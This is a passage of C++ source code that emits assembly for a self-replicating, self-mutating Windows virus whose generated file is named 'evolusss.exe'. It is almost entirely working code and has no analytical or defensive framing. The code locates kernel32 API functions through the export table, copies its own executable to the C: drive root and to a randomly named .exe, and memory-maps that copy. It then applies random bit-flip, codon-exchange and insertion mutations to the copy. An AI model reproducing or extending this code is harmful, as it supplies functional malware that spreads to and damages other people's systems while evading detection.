file << "               _sub0001" << endl; CreateAnIntron();
file << "               _sub0001" << endl; CreateAnIntron();
file << "               _saveJmpOff      ; mov BA2, eip" << endl; CreateAnIntron();


file << "               _pushall" << endl; CreateAnIntron();
file << "                       ; RegA=free  | used for pointer within the Name Pointer Table" << endl; CreateAnIntron();
file << "                       ; RegB=free  | used as temporary buffer" << endl; CreateAnIntron();
file << "                       ; RegD=MagicNumber for API" << endl; CreateAnIntron();
file << "                       ; Stack:  | counter (number of APIs checked in kernel32.dll)" << endl; CreateAnIntron();

GetAddress("hNamePointerTable");
file << "                       _getdata" << endl; CreateAnIntron();
file << "                       _nopdA               ; Pointer to Name Pointer Table (points to first API)" << endl; CreateAnIntron();

zer0(0);
file << "                       _sub0001" << endl; CreateAnIntron();
file << "                       _push                ; counter" << endl; CreateAnIntron();

file << "                  ; SearchNextAPI:" << endl; CreateAnIntron();
file << "                       _getEIP" << endl; CreateAnIntron();
file << "                       _sub0001" << endl; CreateAnIntron();
file << "                       _sub0001" << endl; CreateAnIntron();
file << "                       _sub0001" << endl; CreateAnIntron();
file << "                       _sub0001" << endl; CreateAnIntron();
file << "                       _sub0001" << endl; CreateAnIntron();
file << "                       _saveJmpOff          ; mov BA2, eip" << endl; CreateAnIntron();

file << "                       _pop" << endl; CreateAnIntron();
addnumber("0x1");
file << "                       _push" << endl; CreateAnIntron();

GetAddress("hDLLlibrary32");
file << "                       _getdata" << endl; CreateAnIntron();
file << "                       _save                ; kernel32.dll position" << endl; CreateAnIntron();

file << "                       _nopsA               ; Pointer to NamePointerTable" << endl; CreateAnIntron();
file << "                       _getdata             ; Points to API name" << endl; CreateAnIntron();
file << "                       _addsaved            ; relative -> absolut" << endl; CreateAnIntron();
file << "                       _sub0001             ; -- (for algorithm)" << endl; CreateAnIntron();
file << "                       _nopdB              ; save Pointer to API name" << endl; CreateAnIntron();


file << "                       _nopsA" << endl; CreateAnIntron();
addnumber("4");
file << "                       _nopdA               ; Has just effects in next loop" << endl; CreateAnIntron();

file << "                       _pushall" << endl; CreateAnIntron();
zer0(0);
file << "                               _nopdA" << endl; CreateAnIntron();

file << "                               _getEIP" << endl; CreateAnIntron();
file << "                               _sub0001" << endl; CreateAnIntron();
file << "                               _sub0001" << endl; CreateAnIntron();
file << "                               _sub0001" << endl; CreateAnIntron();
file << "                               _sub0001" << endl; CreateAnIntron();
file << "                               _sub0001" << endl; CreateAnIntron();
file << "                               _saveJmpOff          ; mov BA2, eip" << endl; CreateAnIntron();

file << "                               _nopsA" << endl; CreateAnIntron();
file << "                               _save                ; RegA=MagicNumber" << endl; CreateAnIntron();

file << "                               _nopsB" << endl; CreateAnIntron();
addnumber("1");
file << "                               _nopdB              ; BC1=NamePointer++" << endl; CreateAnIntron();

file << "                               _getdata             ; BC1=dword[NamePointer+n]" << endl; CreateAnIntron();

file << "                               _addsaved            ; BC1=BC1 + BC2 = dword[NamePointer+n] xor MagicNumber" << endl; CreateAnIntron();
file << "                               _nopdA" << endl; CreateAnIntron();

zer0(0);
addnumber("8");
file << "                               _save" << endl; CreateAnIntron();

file << "                               _nopsB" << endl; CreateAnIntron();
file << "                               _getdata             ; BC1=nxxx" << endl; CreateAnIntron();
file << "                               _shr                 ; BC1=???n" << endl; CreateAnIntron();
file << "                               _push" << endl; CreateAnIntron();

zer0(0);
addnumber("0xFF");
file << "                               _save                ; BC2=0xFF" << endl; CreateAnIntron();
file << "                               _pop                 ; BC1=???n" << endl; CreateAnIntron();
file << "                               _and                 ; BC1=000n" << endl; CreateAnIntron();

file << "                               _JnzUp" << endl; CreateAnIntron();

GetAddress("APITmpBuffer");
file << "                               _saveWrtOff" << endl; CreateAnIntron();
file << "                               _nopsA" << endl; CreateAnIntron();
file << "                               _writeDWord          ; mov dword[APITmpBuffer], RegA" << endl; CreateAnIntron();

file << "                       _popall" << endl; CreateAnIntron();

GetAddress("APITmpBuffer");
file << "                       _getdata" << endl; CreateAnIntron();
file << "                       _nopdB              ; save MagicNumber of this API" << endl; CreateAnIntron();


zer0(0);
addnumber("0x0FFF");
file << "                       _save                ; save 0x0FFF in BC2" << endl; CreateAnIntron();

file << "                       _nopsB" << endl; CreateAnIntron();
file << "                       _and                 ; BC1=dword[MagicNumberOfThisAPI] && 0x0FFF" << endl; CreateAnIntron();
file << "                       _nopdB" << endl; CreateAnIntron();

file << "                       _nopsD               ; Get Pointer to API MagicWord" << endl; CreateAnIntron();
file << "                       _getdata" << endl; CreateAnIntron();
file << "                       _and                 ; BC1=dword[MagicNumberSearchAPI] && 0x0FFF" << endl; CreateAnIntron();
file << "                       _save                ; save" << endl; CreateAnIntron();

file << "                       _nopsB               ; Get MagicNumber of current API again" << endl; CreateAnIntron();
file << "                       _xor                 ; (dword[MagicNumberSearchAPI] && 0x0FFF) XOR dword[MagicNumberOfThisAPI] && 0x0FFF" << endl; CreateAnIntron();
file << "                                            ; If zero, assume that we found API" << endl; CreateAnIntron();
file << "                   _JnzUp" << endl; CreateAnIntron();


zer0(0);
addnumber("1");
file << "                       _save                ; BC2=1" << endl; CreateAnIntron();

file << "                       _pop                 ; Get Counter from Stack" << endl; CreateAnIntron();
file << "                       _shl                 ; BC1=counter*2 (because Ordinal Table has just 2byte Entries)" << endl; CreateAnIntron();
file << "                                               ; (=no DLLs with more than 65535 functions?!)" << endl; CreateAnIntron();
file << "                       _save" << endl; CreateAnIntron();

GetAddress("hOrdinalTable");
file << "                       _getdata" << endl; CreateAnIntron();
file << "                       _addsaved            ; Points to ordinal number of the API" << endl; CreateAnIntron();

file << "                       _push" << endl; CreateAnIntron();
zer0(0);
addnumber("0xFFFF");
file << "                       _save" << endl; CreateAnIntron();
file << "                       _pop                 ; BC2=0xFFFF" << endl; CreateAnIntron();

file << "                       _getdata             ; BC1=Ordinal Number of API" << endl; CreateAnIntron();
file << "                                               ; Ordinal Number is a word, so we have to set the high word to zero" << endl; CreateAnIntron();
file << "                       _and                 ; BC1=dword[Ordinal] && 0xFFFF" << endl; CreateAnIntron();

file << "                       _push" << endl; CreateAnIntron();
zer0(0);
addnumber("2");
file << "                       _save" << endl; CreateAnIntron();
file << "                       _pop" << endl; CreateAnIntron();
file << "                       _shl                 ; BC1=Ordinal*4, as Addresse to Function is a dword" << endl; CreateAnIntron();

file << "                       _save" << endl; CreateAnIntron();

GetAddress("hAddressTable");
file << "                       _getdata" << endl; CreateAnIntron();

file << "                       _addsaved            ; BC1 points to Addresse of API Function" << endl; CreateAnIntron();
file << "                       _getdata             ; BC1=Addresse of API Function" << endl; CreateAnIntron();
file << "                       _save" << endl; CreateAnIntron();

GetAddress("hDLLlibrary32");
file << "                       _getdata" << endl; CreateAnIntron();
file << "                       _addsaved            ; relative -> absolut" << endl; CreateAnIntron();
file << "                                               ; BC1 contains the Addresse of the API in (kernel32) memory" << endl; CreateAnIntron();


file << "                       _nopdB              ; save the Addresse in RegB" << endl; CreateAnIntron();
GetAddress("hAddressePointer");
file << "                       _getdata             ; Pointer to the buffer where we save the API addresse" << endl; CreateAnIntron();
file << "                       _saveWrtOff          ; We will write to this Addresse" << endl; CreateAnIntron();

file << "                       _nopsB               ; restore API Addresse" << endl; CreateAnIntron();

file << "                       _writeDWord          ; Save the API Function Addresse in the Function Buffer!!!" << endl; CreateAnIntron();


file << "               _popall" << endl; CreateAnIntron();

GetAddress("hAddressePointer");
file << "               _saveWrtOff      ; The buffer where we save the pointer" << endl; CreateAnIntron();

file << "               _nopsA" << endl; CreateAnIntron();
addnumber("0x4");

file << "               _writeDWord      ; save pointer" << endl; CreateAnIntron();
file << "               _nopdA           ; save different (prevents a more messy code)" << endl; CreateAnIntron();

file << "               _nopsD           ; Next Magic Number for API" << endl; CreateAnIntron();
addnumber("0x4");
file << "               _nopdD" << endl; CreateAnIntron();

file << "               _nopsB" << endl; CreateAnIntron();
addnumber("0x1");
file << "               _nopdB" << endl; CreateAnIntron();
file << "               _save" << endl; CreateAnIntron();

GetAddress("APINumber");
file << "               _getdata" << endl; CreateAnIntron();


subsaved(0);
file << "               _JnzUp           ; Jnz FindAllAPIsNext" << endl; CreateAnIntron();

file << "           ; end FindAllAPIsNext" << endl; CreateAnIntron();

file << "       _popall" << endl; CreateAnIntron();
file << "       ; FoundAPI" << endl; CreateAnIntron();

file << "; end FindAllAPIs in kernel32.dll" << endl; CreateAnIntron();

GetAddress("stDLLadvapi32");
file << "       _push" << endl; CreateAnIntron();
file << "       _CallAPILoadLibrary      ; invoke LoadLibrary, " << static_cast<char>(34) << "kernel32.dll" << static_cast<char>(34) << "" << endl; CreateAnIntron();


GetAddress("hDLLlibrary32");
file << "       _saveWrtOff" << endl; CreateAnIntron();


file << "       _nopsA" << endl; CreateAnIntron();
file << "       _writeDWord              ; mov dword[hDLLkernel32], eax" << endl; CreateAnIntron();

file << "       _save                    ; Save kernel32.dll position" << endl; CreateAnIntron();

addnumber("0x3C");
file << "       _getdata                 ; mov RegB, dword[hDLLkernel32+0x3C]" << endl; CreateAnIntron();

file << "                                   ; = Pointer to PE Header of kernel32.dll" << endl; CreateAnIntron();
file << "       _addsaved                ; relative -> absolut" << endl; CreateAnIntron();

addnumber("0x78");
file << "       _getdata                 ; Export Tables" << endl; CreateAnIntron();
file << "       _addsaved                ; relative -> absolut" << endl; CreateAnIntron();
addnumber("0x1C");

file << "       _nopdA                   ; temporarily save Offset of Addresse Table in RegA" << endl; CreateAnIntron();

GetAddress("hAddressTable");
file << "       _saveWrtOff              ; WriteOffset=hAddressTable" << endl; CreateAnIntron();

file << "       _nopsA                   ; restore RegA=Addresse Tables" << endl; CreateAnIntron();
file << "       _getdata                 ; Pointer To Addresse Table" << endl; CreateAnIntron();
file << "       _addsaved                ; relative -> absolut" << endl; CreateAnIntron();
file << "       _writeDWord              ; mov dword[hAddressTable], (Pointer to Addresse Table)" << endl; CreateAnIntron();

GetAddress("hNamePointerTable");
file << "       _saveWrtOff              ; WriteOffset=hNamePointerTable" << endl; CreateAnIntron();

file << "       _nopsA                   ; BC1=Addresse Table" << endl; CreateAnIntron();
addnumber("4");
file << "       _nopdA" << endl; CreateAnIntron();

file << "       _getdata                 ; Pointer To Name Table" << endl; CreateAnIntron();
file << "       _addsaved                ; relative -> absolut" << endl; CreateAnIntron();
file << "       _writeDWord              ; mov dword[hNamePointerTable], (Pointer to Name Pointer Table)" << endl; CreateAnIntron();

GetAddress("hOrdinalTable");
file << "       _saveWrtOff              ; WriteOffset=hOrdinalTable" << endl; CreateAnIntron();

file << "       _nopsA" << endl; CreateAnIntron();
addnumber("4");

file << "       _getdata                 ; Ordinal Table" << endl; CreateAnIntron();
file << "       _addsaved                ; relative -> absolut" << endl; CreateAnIntron();
file << "       _writeDWord              ; mov dword[hOrdinalTable], (Pointer to Ordinal Table)" << endl; CreateAnIntron();


GetAddress("APINumber");
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("APINumberAdvapi");
file << "       _writeDWord              ; Save number of kernel32.dll APIs" << endl; CreateAnIntron();

GetAddress("hAddressePointer");
file << "       _saveWrtOff" << endl; CreateAnIntron();
GetAddress("APIAddressesReg");
file << "       _writeDWord      ; Saves the AddressePointer" << endl; CreateAnIntron();


GetAddress("hMagicNumberPointer");
file << "       _saveWrtOff" << endl; CreateAnIntron();
GetAddress("APIMagicNumbersReg");
file << "       _writeDWord      ; Saves the MagicNumber Pointer" << endl; CreateAnIntron();


zer0(0);
addnumber("42");
file << "       _save" << endl; CreateAnIntron();
file << "       _pop" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _push" << endl; CreateAnIntron();
addnumber("1");
file << "       _xor" << endl; CreateAnIntron();
file << "       _JnzUp" << endl; CreateAnIntron();

file << "       _pop                    ; Remove trash from stack" << endl; CreateAnIntron();


zer0(0);
addnumber("0x8007");
file << "       _push" << endl; CreateAnIntron();
CallAPI("hSetErrorMode");

CallAPI("hGetTickCount");


file << "; ############################################################################" << endl; CreateAnIntron();
file << "; ############################################################################" << endl; CreateAnIntron();
file << "; ############################################################################" << endl; CreateAnIntron();
file << "; #####" << endl; CreateAnIntron();
file << "; #####   First child ..." << endl; CreateAnIntron();
file << "; #####" << endl; CreateAnIntron();


GetAddress("RandomNumber");
file << "       _saveWrtOff" << endl; CreateAnIntron();
file << "       _nopsA" << endl; CreateAnIntron();
file << "       _writeDWord              ; mov dword[RandomNumber], RegA" << endl; CreateAnIntron();

zer0(0);
file << "       _nopdB                  ; mov RegB, 0" << endl; CreateAnIntron();


file << ";   RndNameLoop:" << endl; CreateAnIntron();
file << "       _getEIP" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _saveJmpOff              ; mov esi, eip" << endl; CreateAnIntron();

GetAddress("RandomNumber");

file << "       _getdata" << endl; CreateAnIntron();
file << "       _nopdA                   ; mov eax, [RandomNumber]" << endl; CreateAnIntron();


zer0(0);
file << "       _nopdD                   ; mov edx, 0" << endl; CreateAnIntron();

addnumber("26");

file << "       _div                     ; div ebx" << endl; CreateAnIntron();

file << "       _nopsD" << endl; CreateAnIntron();
addnumber("97");
file << "       _nopdD                   ; add edx, 97" << endl; CreateAnIntron();

file << "       _nopsB      ; ebx=ebp=count" << endl; CreateAnIntron();
file << "       _save       ; ebp=ebx=ecx=count" << endl; CreateAnIntron();

GetAddress("RandomFileName");
file << "                      ; ebx=rfn, ebp=ecx=count" << endl; CreateAnIntron();
file << "       _addsaved   ; ebx=rfn+count, ebp=ecx=count" << endl; CreateAnIntron();
file << "       _saveWrtOff ; edi=rfn+count, ebx=rfn+count, ebp=ecx=count" << endl; CreateAnIntron();


file << "       _nopsD" << endl; CreateAnIntron();
file << "       _writeByte               ; mov byte[ecx+RandomFileName], dl" << endl; CreateAnIntron();

CalcNewRandNumberAndSaveIt();

file << "       _nopsB" << endl; CreateAnIntron();
addnumber("1");
file << "       _nopdB" << endl; CreateAnIntron();
file << "       _save                    ; inc counter" << endl; CreateAnIntron();

zer0(1);
addnumber("8");
subsaved(0);


file << "       _JnzUp                   ; jnz esi" << endl; CreateAnIntron();
file << "; loop RndNameLoop" << endl; CreateAnIntron();

GetAddress("rndext");
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("\'.exe\'");
file << "       _writeDWord              ; create extention" << endl; CreateAnIntron();

CallAPI("hGetCommandLineA");
zer0(0);
addnumber("0xFF");
file << "       _save" << endl; CreateAnIntron();

file << "       _nopsA" << endl; CreateAnIntron();
file << "       _getdata" << endl; CreateAnIntron();
file << "       _and" << endl; CreateAnIntron();

file << "       _nopdB           ; RegB=1st byte of filename" << endl; CreateAnIntron();
zer0(0);
addnumber("34");
file << "       _nopdD           ; RegD=34" << endl; CreateAnIntron();


file << "       _nopsB" << endl; CreateAnIntron();
file << "       _save" << endl; CreateAnIntron();
file << "       _nopsD" << endl; CreateAnIntron();
subsaved(0);

file << "       _JnzDown" << endl; 
file << "           _nopsA" << endl; 
file << "           _add0001" << endl; 
file << "           _nopdA" << endl;
file << "           _nopREAL" << endl;

file << "       _nopsA" << endl; CreateAnIntron();
file << "       _push               ; Save RegA at stack" << endl; CreateAnIntron();

file << "; FindEndOfString:" << endl; CreateAnIntron();
file << "       _getEIP" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _saveJmpOff         ; mov esi, eip" << endl; CreateAnIntron();

file << "       _nopsA" << endl; CreateAnIntron();
addnumber("1");
file << "       _nopdA" << endl; CreateAnIntron();

zer0(0);
addnumber("0xFF");
file << "       _save" << endl; CreateAnIntron();
file << "       _nopsA" << endl; CreateAnIntron();
file << "       _getdata" << endl; CreateAnIntron();
file << "       _and" << endl; CreateAnIntron();
file << "       _nopdD               ; RegD=(dword[Name+count]&& 0xFF)" << endl; CreateAnIntron();

zer0(0);
addnumber("34");
file << "       _save" << endl; CreateAnIntron();
file << "       _nopsB               ; 1st Byte of filename" << endl; CreateAnIntron();
subsaved(1);

file << "       _JnzDown" << endl;
file << "           _nopsD" << endl;
file << "           _xor" << endl;
file << "           _JnzUp" << endl;
file << "           _nopREAL" << endl; 
file << "; EndFindEndOfString:" << endl; CreateAnIntron();

file << "       _nopsA" << endl; CreateAnIntron();
file << "       _saveWrtOff" << endl; CreateAnIntron();

zer0(1);
addnumber("34");
file << "       _nopsB               ; 1st Byte of filename" << endl; CreateAnIntron();
subsaved(0);
file << "       _JnzDown" << endl; 
file << "           _save" << endl; 
file << "           _xor" << endl;
file << "           _writeByte" << endl;
file << "           _nopREAL" << endl;

file << "       _pop" << endl; CreateAnIntron();
file << "       _nopdA" << endl; CreateAnIntron();


GetAddress("Driveletter3-1");
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("0x5C3A4300");
file << "       _writeDWord" << endl; CreateAnIntron();

GetAddress("virusname");
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("\'evol\'");
file << "       _writeDWord" << endl; CreateAnIntron();

GetAddress("virusname+4");
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("\'usss\'");
file << "       _writeDWord                  ; Construct virusfilename" << endl; CreateAnIntron();

GetAddress("virext");
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("\'.exe\'");
file << "       _writeDWord                  ; create extention" << endl; CreateAnIntron();

file << "       _nopsA" << endl; CreateAnIntron();
file << "       _push                       ; Save pointer to filename buffer" << endl; CreateAnIntron();
zer0(0);
file << "       _push" << endl; CreateAnIntron();
GetAddress("Driveletter3");
file << "       _push" << endl; CreateAnIntron();
file << "       _nopsA" << endl; CreateAnIntron();
file << "       _push" << endl; CreateAnIntron();
CallAPI("hCopyFileA");

file << "       _pop" << endl; CreateAnIntron();
file << "       _nopdA" << endl; CreateAnIntron();
zer0(0);
file << "       _push" << endl; CreateAnIntron();
GetAddress("RandomFileName");
file << "       _push" << endl; CreateAnIntron();
file << "       _nopsA" << endl; CreateAnIntron();
file << "       _push" << endl; CreateAnIntron();
CallAPI("hCopyFileA");

zer0(0);
file << "       _push" << endl; CreateAnIntron();
file << "       _push" << endl; CreateAnIntron();
addnumber("3");
file << "       _push" << endl; CreateAnIntron();
zer0(0);
file << "       _push" << endl; CreateAnIntron();
addnumber("1");
file << "       _push" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
addnumber("0xC0000000");
file << "       _push" << endl; CreateAnIntron();
GetAddress("RandomFileName");
file << "       _push" << endl; CreateAnIntron();
CallAPI("hCreateFileA");


GetAddress("FileHandle");
file << "       _saveWrtOff" << endl; CreateAnIntron();
file << "       _nopsA" << endl; CreateAnIntron();
file << "       _writeDWord              ; mov dword[FileHandle], RegA" << endl; CreateAnIntron();

file << "       _save" << endl; CreateAnIntron();

GetAddress("FileSize");

file << "       _push" << endl; CreateAnIntron();
zer0(1);
file << "       _addsaved" << endl; CreateAnIntron();
file << "       _push" << endl; CreateAnIntron();
CallAPI("hGetFileSize");

GetAddress("FileSize");
file << "       _saveWrtOff" << endl; CreateAnIntron();
file << "       _nopsA" << endl; CreateAnIntron();
file << "       _writeDWord              ; mov dword[FileSize], RegA" << endl; CreateAnIntron();

zer0(1);
file << "       _push" << endl; CreateAnIntron();
file << "       _addsaved" << endl; CreateAnIntron();
file << "       _push" << endl; CreateAnIntron();
zer0(0);
file << "       _push" << endl; CreateAnIntron();
addnumber("4");
file << "       _push" << endl; CreateAnIntron();
zer0(0);
file << "       _push" << endl; CreateAnIntron();
GetAddress("FileHandle");
file << "       _getdata" << endl; CreateAnIntron();
file << "       _push" << endl; CreateAnIntron();
CallAPI("hCreateFileMappingA");

GetAddress("MapHandle");

file << "       _saveWrtOff" << endl; CreateAnIntron();
file << "       _nopsA" << endl; CreateAnIntron();
file << "       _writeDWord               ; mov dword[MapHandle], RegA" << endl; CreateAnIntron();

file << "       _save" << endl; CreateAnIntron();
GetAddress("FileSize");

file << "       _getdata" << endl; CreateAnIntron();
file << "       _push   ; [FileSize]" << endl; CreateAnIntron();
zer0(1);
file << "       _push   ; 0" << endl; CreateAnIntron();
file << "       _push   ; 0" << endl; CreateAnIntron();
addnumber("2");
file << "       _push" << endl; CreateAnIntron();
zer0(1);
file << "       _addsaved" << endl; CreateAnIntron();
file << "       _push   ; MapHandle" << endl; CreateAnIntron();

CallAPI("hMapViewOfFile");

GetAddress("MapPointer");

file << "       _saveWrtOff" << endl; CreateAnIntron();
file << "       _nopsA" << endl; CreateAnIntron();
file << "       _writeDWord              ; mov dword[MapPointer], RegA" << endl; CreateAnIntron();

file << "       _nopsA" << endl; CreateAnIntron();
file << "       _nopdB                  ; mov RegB, RegA+AminoStartInMap" << endl; CreateAnIntron();




file << "; ############################################################################" << endl; CreateAnIntron();
file << "; ############################################################################" << endl; CreateAnIntron();
file << "; #####" << endl; CreateAnIntron();
file << "; #####  Here the mutation happens: Bitmutation, exchange of codons, ..." << endl; CreateAnIntron();
file << "; #####" << endl; CreateAnIntron();

file << ";ANextByteInChain:" << endl; CreateAnIntron();
file << "       _getEIP" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _saveJmpOff              ; mov BA2, eip" << endl; CreateAnIntron();

file << "       _nopsB" << endl; CreateAnIntron();
file << "       _push                    ; push counter" << endl; CreateAnIntron();


file << "; ############################################################################" << endl; CreateAnIntron();
file << "; ##### Start Bit-Flip Mutation (Point-Mutation)" << endl; CreateAnIntron();

zer0(0);
addnumber("12");
file << "       _save" << endl; CreateAnIntron();

GetAddress("RandomNumber");

file << "       _getdata" << endl; CreateAnIntron();
file << "       _shr" << endl; CreateAnIntron();
file << "       _push" << endl; CreateAnIntron();

zer0(0);
addnumber("7");
file << "       _save" << endl; CreateAnIntron();

file << "       _pop" << endl; CreateAnIntron();
file << "       _and                     ; BC1=[RandomNumber shr 12] && 0111b" << endl; CreateAnIntron();
file << "       _save" << endl; CreateAnIntron();

zer0(1);
addnumber("1");
file << "       _shl                     ; shl BC1, BC2" << endl; CreateAnIntron();
file << "       _save" << endl; CreateAnIntron();

file << "       _pop" << endl; CreateAnIntron();
file << "       _push" << endl; CreateAnIntron();
file << "       _saveWrtOff              ; BA1=[MapPointer]+counter" << endl; CreateAnIntron();

file << "       _getdata                 ; mov BC1, dword[BC1]" << endl; CreateAnIntron();
file << "       _xor                     ; xor BC1, BC2" << endl; CreateAnIntron();
file << "       _nopdB                   ; save changed byte" << endl; CreateAnIntron();


zer0(0);
addnumber("7");
file << "       _save" << endl; CreateAnIntron();

GetAddress("RandomNumber");

file << "       _getdata" << endl; CreateAnIntron();
file << "       _nopdA" << endl; CreateAnIntron();

zer0(1);
file << "       _nopdD" << endl; CreateAnIntron();

addnumber("VarThreshold1");

file << "       _div" << endl; CreateAnIntron();
file << "       _nopsD" << endl; CreateAnIntron();
subsaved(0);
file << "       _JnzDown" << endl;
file << "               _nopsB                   ; restore" << endl;
file << "               _writeByte               ; save mutation!" << endl; 
file << "               _nopREAL" << endl;
file << "               _nopREAL" << endl;


file << "; ##### Finished Bit-Flip Mutation (Point-Mutation)" << endl; CreateAnIntron();
file << "; ############################################################################" << endl; CreateAnIntron();


CalcNewRandNumberAndSaveIt();


file << "; ############################################################################" << endl; CreateAnIntron();
file << "; ##### Start codons exchange" << endl; CreateAnIntron();


GetAddress("xchgBuffer");
file << "       _saveWrtOff" << endl; CreateAnIntron();

file << "       _pop" << endl; CreateAnIntron();
file << "       _push                        ; get counter" << endl; CreateAnIntron();

file << "       _getdata" << endl; CreateAnIntron();
file << "       _writeDWord                  ; xchgBuffer=dword[counter]" << endl; CreateAnIntron();

file << "       _pop" << endl; CreateAnIntron();
file << "       _push                        ; get counter" << endl; CreateAnIntron();
file << "       _saveWrtOff                  ; save destination for potential writing" << endl; CreateAnIntron();

addnumber("4");
file << "       _getdata" << endl; CreateAnIntron();
file << "       _nopdB                       ; RegB=dword[counter+4]" << endl; CreateAnIntron();


zer0(0);
addnumber("7");
file << "       _save" << endl; CreateAnIntron();
GetAddress("RandomNumber");

file << "       _getdata" << endl; CreateAnIntron();
file << "       _nopdA" << endl; CreateAnIntron();

zer0(1);
file << "       _nopdD" << endl; CreateAnIntron();

addnumber("xchgThreshold1");

file << "       _div" << endl; CreateAnIntron();
file << "       _nopsD" << endl; CreateAnIntron();
subsaved(0);

file << "       _JnzDown                 ; if not zero, dont exchange codons" << endl; 
file << "           _nopsB                   ; restore" << endl;
file << "           _writeDWord              ; save mutation!" << endl;
file << "           _nopREAL" << endl;
file << "           _nopREAL" << endl;

GetAddress("xchgBuffer");
file << "       _getdata" << endl; CreateAnIntron();

file << "       _nopdB" << endl; CreateAnIntron();

file << "       _pop" << endl; CreateAnIntron();
file << "       _push                    ; get counter" << endl; CreateAnIntron();
addnumber("4");
file << "       _saveWrtOff" << endl; CreateAnIntron();


zer0(0);
addnumber("7");
file << "       _save" << endl; CreateAnIntron();
GetAddress("RandomNumber");

file << "       _getdata" << endl; CreateAnIntron();
file << "       _nopdA" << endl; CreateAnIntron();

zer0(1);
file << "       _nopdD" << endl; CreateAnIntron();

addnumber("xchgThreshold1");

file << "       _div" << endl; CreateAnIntron();
file << "       _nopsD" << endl; CreateAnIntron();
subsaved(0);

file << "       _JnzDown                 ; if not zero, dont exchange codons" << endl;
file << "           _nopsB                   ; restore" << endl;
file << "           _writeDWord              ; save mutation!" << endl;
file << "           _nopREAL" << endl;
file << "           _nopREAL" << endl;



CalcNewRandNumberAndSaveIt();


file << "       _pop" << endl; CreateAnIntron();
addnumber("1");
file << "       _nopdB                   ; inc counter" << endl; CreateAnIntron();

GetAddress("MapPointer");
file << "       _getdata" << endl; CreateAnIntron();
file << "       _save" << endl; CreateAnIntron();
zer0(1);

GetAddress("FileSize");
file << "       _getdata" << endl; CreateAnIntron();

file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001     ; Dont mutate the last 9 bytes because of xchg problems" << endl; CreateAnIntron();

file << "       _addsaved" << endl; CreateAnIntron();
file << "       _save                    ; mov save, [MapPointer]+GenomEndInMap" << endl; CreateAnIntron();

file << "       _nopsB" << endl; CreateAnIntron();
subsaved(0);
file << "       _JnzUp                   ; jnz esi" << endl; CreateAnIntron();
file << "; loop ANextByteInChain" << endl; CreateAnIntron();

file << "; ##### Finished codons exchange" << endl; CreateAnIntron();
file << "; ############################################################################" << endl; CreateAnIntron();

GetAddress("RandomNumber");

file << "       _getdata" << endl; CreateAnIntron();
file << "       _nopdA" << endl; CreateAnIntron();
zer0(0);
file << "       _nopdD" << endl; CreateAnIntron();

addnumber("InsertThreshold1");

file << "       _div" << endl; CreateAnIntron();
file << "       _nopsD" << endl; CreateAnIntron();

file << "       _push                ; Save Result = (rand() % InsertThreshold1)" << endl; CreateAnIntron();

CalcNewRandNumberAndSaveIt();





GetAddress("RandomNumber");
file << "       _getdata" << endl; CreateAnIntron();
file << "       _nopdA                               ; mov RegA, [RandomNumber]" << endl; CreateAnIntron();

zer0(0);
file << "       _nopdD                               ; mov RegD, 0" << endl; CreateAnIntron();

GetAddress("FileSize");
file << "       _getdata" << endl; CreateAnIntron();
file << "       _nopdB                               ; RegB=FileSize" << endl; CreateAnIntron();

file << "       _div                                 ; div BC1 <- RegD = rand() % FileSize = nBeforeIns" << endl; CreateAnIntron();

GetAddress("InsStart");
file << "       _saveWrtOff" << endl; CreateAnIntron();

file << "       _nopsD                               ; BC1=nBeforeIns" << endl; CreateAnIntron();
file << "       _save                                ; BC2=nBeforeIns" << endl; CreateAnIntron();

file << "       _nopsB                               ; BC1=FileSize" << endl; CreateAnIntron();
subsaved(1);
file << "       _nopdB                               ; RegB=(FileSize-nBeforeIns)" << endl; CreateAnIntron();

GetAddress("MapPointer");
file << "       _getdata                             ; BC1=MapPoint" << endl; CreateAnIntron();
file << "       _addsaved                            ; BC1=MapPoint + nBeforeIns = InsStart" << endl; CreateAnIntron();

file << "       _writeDWord                          ; !!! InsStart=MapPoint + nBeforeIns" << endl; CreateAnIntron();
file << "       _push" << endl; CreateAnIntron();



CalcNewRandNumberAndSaveIt();

GetAddress("nBlockSize");
file << "       _saveWrtOff" << endl; CreateAnIntron();

GetAddress("RandomNumber");
file << "       _getdata" << endl; CreateAnIntron();
file << "       _nopdA                               ; mov RegA, [RandomNumber]" << endl; CreateAnIntron();

zer0(0);
file << "       _nopdD                               ; mov RegD, 0" << endl; CreateAnIntron();
addnumber("32");

file << "       _div                                 ; div BC1 <- RegD = rand() % 32 = nBlockSize" << endl; CreateAnIntron();



file << "       _nopsD                               ; BC1=nBlockSize" << endl; CreateAnIntron();
addnumber("1");
file << "       _writeDWord                          ; !!! nBlockSize" << endl; CreateAnIntron();

file << "       _save                                ; BC2=nBlockSize" << endl; CreateAnIntron();

GetAddress("InsEnd");
file << "       _saveWrtOff" << endl; CreateAnIntron();

